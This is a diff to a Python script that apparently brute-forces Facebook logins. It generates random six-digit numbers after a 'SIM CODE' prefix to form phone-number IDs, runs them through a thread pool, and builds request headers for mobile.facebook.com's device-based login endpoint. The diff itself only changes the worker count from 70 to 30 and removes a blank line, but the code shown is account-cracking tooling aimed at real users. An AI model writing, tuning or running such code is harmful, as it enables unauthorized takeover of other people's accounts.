@@ -272,7 +272,7 @@ def rndm():
         for __BLACK__ in range(limit):
                 _Xx_ = ''.join(random.choice(string.digits) for _ in range(6))
                 user.append(_Xx_)
-        with tred(max_workers=70) as _BLACK_:
+        with tred(max_workers=30) as _BLACK_:
                 tl = str(len(user))
                 clear()
                 print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m SIM CODE  : \033[38;5;34m{code}')
@@ -651,7 +651,6 @@ def _M6_(ids,pase):
                         'had_cp_prefilled': 'true',
                         'had_password_prefilled': 'true',
                         'ab_test_data': 'AAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAABAAB'}
-
                         tedy = {'authority': 'mobile.facebook.com',
                         'method': 'GET',
                         'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
